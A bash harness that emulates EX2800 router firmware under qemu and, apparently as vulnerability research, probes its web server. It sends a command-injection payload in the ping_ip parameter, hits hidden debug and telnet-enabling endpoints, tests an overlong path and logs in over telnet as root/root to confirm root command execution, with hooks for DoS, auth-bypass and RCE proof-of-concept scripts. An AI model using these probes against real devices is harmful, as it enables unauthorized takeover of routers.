#!/usr/bin/env bash
set -euo pipefail

PROOT_BIN=${PROOT_BIN:?set PROOT_BIN}
PROOT_LIB_DIR=${PROOT_LIB_DIR:?set PROOT_LIB_DIR}
QEMU_BIN=${QEMU_BIN:?set QEMU_BIN}
FIRMWARE_ROOT=${FIRMWARE_ROOT:?set FIRMWARE_ROOT}
GUEST_LD_PRELOAD=${GUEST_LD_PRELOAD:-}
GUEST_QEMU_ENV=${GUEST_QEMU_ENV:-LD_PRELOAD=$GUEST_LD_PRELOAD}
HTTPD_UID=${HTTPD_UID:-}
HTTPD_USER=${HTTPD_USER:-}
VALIDATE_TELNET=${VALIDATE_TELNET:-0}
POC_BIN=${POC_BIN:-}
DOS_POC_BIN=${DOS_POC_BIN:-}
AUTH_BYPASS_POC_BIN=${AUTH_BYPASS_POC_BIN:-}
AUTH_MATRIX_BIN=${AUTH_MATRIX_BIN:-}
UNCONFIGURED_RCE_POC_BIN=${UNCONFIGURED_RCE_POC_BIN:-}
SKIP_STANDARD_PROBES=${SKIP_STANDARD_PROBES:-0}
FINAL_LOG_LINES=${FINAL_LOG_LINES:-30}
LOGIC_BIN=${LOGIC_BIN:-}
LOGIC_GUEST_LD_PRELOAD=${LOGIC_GUEST_LD_PRELOAD:-}
MODEL_FILE_BIND=${MODEL_FILE_BIND:-}
PORT=${PORT:-18080}
BASE_URL=${BASE_URL:-http://[::1]:80}
LOG=${LOG:-/tmp/friday-ex2800-httpd.log}
MARKER=/var/tmp/friday-ex2800-rce-marker

rm -f "$MARKER" "$LOG"
ip link set lo up 2>/dev/null || true

logic_pid=
if [[ -n "$LOGIC_BIN" ]]; then
  env PROOT_NO_SECCOMP=1 LD_LIBRARY_PATH="$PROOT_LIB_DIR" \
    QEMU_SET_ENV="LD_PRELOAD=$LOGIC_GUEST_LD_PRELOAD" \
    "$PROOT_BIN" -R "$FIRMWARE_ROOT" -q "$QEMU_BIN" \
    "$LOGIC_BIN" >>"$LOG" 2>&1 &
  logic_pid=$!
  for _ in $(seq 1 100); do
    [[ -e "$FIRMWARE_ROOT/var/pid/0x01" ]] && break
    kill -0 "$logic_pid" 2>/dev/null || break
    sleep 0.2
  done
fi

httpd_command=(
  env PROOT_NO_SECCOMP=1 LD_LIBRARY_PATH="$PROOT_LIB_DIR"
  QEMU_STRACE="${QEMU_STRACE:-}"
  QEMU_SET_ENV="$GUEST_QEMU_ENV"
  "$PROOT_BIN" -R "$FIRMWARE_ROOT"
)
if [[ -n "$MODEL_FILE_BIND" ]]; then
  httpd_command+=(-b "$MODEL_FILE_BIND:/proc/llconfig/model")
fi
httpd_command+=(
  -q "$QEMU_BIN" -w /usr/www
  /usr/sbin/mini_httpd -D -p "$PORT" -d /usr/www -c '/cgi-bin/*'
)
if [[ -n "$HTTPD_USER" ]]; then
  httpd_command+=(-u "$HTTPD_USER")
fi
if [[ -n "$HTTPD_UID" ]]; then
  setpriv --reuid="$HTTPD_UID" --regid="$HTTPD_UID" --clear-groups \
    "${httpd_command[@]}" >"$LOG" 2>&1 &
else
  "${httpd_command[@]}" >"$LOG" 2>&1 &
fi
server_pid=$!
inetd_pid=
telnetd_pid=
cleanup() {
  if [[ -n "$telnetd_pid" ]]; then
    kill "$telnetd_pid" 2>/dev/null || true
    wait "$telnetd_pid" 2>/dev/null || true
  fi
  if [[ -n "$inetd_pid" ]]; then
    kill "$inetd_pid" 2>/dev/null || true
    wait "$inetd_pid" 2>/dev/null || true
  fi
  kill "$server_pid" 2>/dev/null || true
  wait "$server_pid" 2>/dev/null || true
  if [[ -n "$logic_pid" ]]; then
    kill "$logic_pid" 2>/dev/null || true
    wait "$logic_pid" 2>/dev/null || true
  fi
}
trap cleanup EXIT

ready=0
for _ in $(seq 1 50); do
  if curl --noproxy '*' -sS --max-time 1 "$BASE_URL/" >/dev/null 2>&1; then
    ready=1
    break
  fi
  if ! kill -0 "$server_pid" 2>/dev/null; then
    break
  fi
  sleep 0.2
done

if [[ $ready != 1 ]]; then
  echo 'service_ready=false'
  echo '--- service log ---'
  tail -n 30 "$LOG" 2>/dev/null || true
  echo '--- process state ---'
  ps -ef | grep -E 'mini_httpd|proot|qemu' | grep -v grep || true
  echo '--- listening sockets ---'
  sed -n '1,20p' /proc/net/tcp /proc/net/tcp6 2>/dev/null || true
  echo '--- firmware web ports ---'
  cat "$FIRMWARE_ROOT/var/webport" 2>/dev/null || true
  exit 1
fi

probe() {
  local name=$1
  local url=$2
  local code
  code=$(curl --noproxy '*' -sS --max-time 3 -o "/tmp/friday-ex2800-${name}.body" -w '%{http_code}' "$url" || true)
  printf '%s=%s\n' "$name" "$code"
}

echo 'service_ready=true'
if [[ "$SKIP_STANDARD_PROBES" != 1 ]]; then
  probe root "$BASE_URL/"
  probe debug "$BASE_URL/cgi-bin/webproc?getpage=debug.htm"
  probe start_telnet "$BASE_URL/start_telnet"
  probe legacy_setup_debug "$BASE_URL/setup.cgi?todo=debug"
  probe legacy_boarddata "$BASE_URL/boardDataWW.php"
  probe legacy_brs_help "$BASE_URL/BRS_02_genieHelp.html"
  probe super_setting "$BASE_URL/super_setting.htm"
  probe webupg_get "$BASE_URL/cgi-bin/webupg"
  probe marker_probe "$BASE_URL/cgi-bin/webproc?getpage=debug.htm&ping_ip=127.0.0.1%3Btouch%20$MARKER"

  long_path=$(printf 'A%.0s' $(seq 1 4096))
  probe bounded_long_path "$BASE_URL/$long_path"
fi

if [[ -e "$FIRMWARE_ROOT/var/telnetd" ]]; then
  echo 'telnet_enable_marker_created=true'
else
  echo 'telnet_enable_marker_created=false'
fi
if grep -q '/usr/sbin/telnetd telnetd' "$FIRMWARE_ROOT/etc/inetd.conf" 2>/dev/null; then
  echo 'telnet_inetd_rule_installed=true'
else
  echo 'telnet_inetd_rule_installed=false'
fi
if python3 -c 'import socket; s=socket.socket(socket.AF_INET6); s.settimeout(2); s.connect(("::1",23)); s.close()' 2>/dev/null; then
  echo 'telnet_port_reachable=true'
else
  echo 'telnet_port_reachable=false'
fi

if [[ "$VALIDATE_TELNET" == 1 && -e "$FIRMWARE_ROOT/var/inetd.conf" ]]; then
  PROOT_NO_SECCOMP=1 LD_LIBRARY_PATH="$PROOT_LIB_DIR" QEMU_SET_ENV='SHELL=/bin/sh' \
    "$PROOT_BIN" -R "$FIRMWARE_ROOT" -q "$QEMU_BIN" \
    /usr/sbin/inetd /etc/inetd.conf >>"$LOG" 2>&1 &
  inetd_pid=$!
  telnet_ready=0
  for _ in $(seq 1 30); do
    if python3 -c 'import socket; s=socket.create_connection(("127.0.0.1",23),.3); s.close()' 2>/dev/null; then
      telnet_ready=1
      break
    fi
    sleep 0.2
  done
  if [[ $telnet_ready == 1 ]]; then
    echo 'telnet_port_reachable_after_root_inetd=true'
    if [[ -n "$POC_BIN" ]]; then
      python3 "$POC_BIN" --target 127.0.0.1 --skip-trigger || true
    else
    python3 - <<'PY'
import telnetlib
import time
import re

client = telnetlib.Telnet("127.0.0.1", 23, 5)
transcript = client.read_until(b"login:", 3)
client.write(b"root\r\n")
transcript += client.read_until(b"Password:", 3)
client.write(b"root\r\n")
time.sleep(1)
try:
    transcript += client.read_very_eager()
    client.write(
        b'while IFS= read -r line; do case "$line" in Uid:*) echo "$line";; esac; '
        b'done < /proc/self/status; echo FRIDAY_TELNET_VALIDATED > '
        b'/root/friday-telnet-validated; echo FRIDAY_TELNET_VALIDATED\r\n'
    )
    time.sleep(1)
    transcript += client.read_very_eager()
except EOFError:
    transcript += b"<EOF>"
print("telnet_transcript=" + repr(transcript[-1000:]))
print(
    "telnet_root_login=true"
    if re.search(rb"Uid:\s+0\s+0\s+0\s+0", transcript)
    else "telnet_root_login=false"
)
print("telnet_command_execution=true" if b"FRIDAY_TELNET_VALIDATED" in transcript else "telnet_command_execution=false")
try:
    client.write(b"exit\r\n")
except (BrokenPipeError, EOFError):
    pass
client.close()
PY
    fi
    if [[ -n "$AUTH_BYPASS_POC_BIN" ]]; then
      python3 "$AUTH_BYPASS_POC_BIN" --target 127.0.0.1 || true
    fi
  else
    echo 'telnet_port_reachable_after_root_inetd=false'
  fi
fi

if kill -0 "$server_pid" 2>/dev/null; then
  echo 'service_alive_after_probes=true'
else
  echo 'service_alive_after_probes=false'
fi
if [[ -e "$FIRMWARE_ROOT$MARKER" ]]; then
  echo 'command_marker_created=true'
else
  echo 'command_marker_created=false'
fi
if [[ -n "$DOS_POC_BIN" ]]; then
  python3 "$DOS_POC_BIN" --target 127.0.0.1 --port 80 || true
fi
if [[ -n "$AUTH_MATRIX_BIN" ]]; then
  python3 "$AUTH_MATRIX_BIN" --target 127.0.0.1 --port 80 \
    --firmware-root "$FIRMWARE_ROOT" || true
fi
if [[ -n "$UNCONFIGURED_RCE_POC_BIN" ]]; then
  python3 "$UNCONFIGURED_RCE_POC_BIN" --target 127.0.0.1 --port 80 \
    --firmware-root "$FIRMWARE_ROOT" || true
fi
echo '--- final service log ---'
tail -n "$FINAL_LOG_LINES" "$LOG" 2>/dev/null || true
